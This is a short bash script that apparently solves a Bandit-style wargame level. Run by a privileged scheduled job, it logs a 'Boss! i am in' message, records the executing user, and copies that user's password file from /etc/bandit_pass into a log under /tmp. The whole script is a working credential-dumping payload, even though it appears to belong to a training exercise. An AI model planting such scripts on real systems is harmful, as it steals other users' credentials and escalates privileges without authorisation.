#!/bin/bash
echo "Boss! i am in..! - $(date)" >>  /tmp/tmp.zeez1QFcoV/mylog.log
myname=$(whoami)
echo "Now I am - $myname" >>  /tmp/tmp.zeez1QFcoV/mylog.log
echo "Peeking at passwordfile /etc/bandit_pass/$myname " >>  /tmp/tmp.zeez1QFcoV/mylog.log
cat /etc/bandit_pass/$myname &>> /tmp/tmp.zeez1QFcoV/mylog.log